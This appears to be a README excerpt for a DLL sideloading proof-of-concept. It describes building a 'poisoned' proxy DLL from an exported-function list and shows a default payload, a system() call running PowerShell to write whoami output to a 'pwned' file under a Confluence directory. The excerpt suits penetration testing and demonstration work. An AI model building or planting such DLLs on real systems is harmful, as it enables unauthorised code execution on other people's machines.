`export.txt` should be a list of exported functions from DLL export viewer (https://www.nirsoft.net/utils/dll_export_viewer.html). 

`python build.py export.txt` which will generate a poinsoned `*.dll` in `build/`. 

For convenience, we've attached a pre-generated dll which will execute the default payload: 

```
system("powershell -command echo DLL sideloading successful as $(whoami) > C:\\\\Confluence\\\\pwned");
```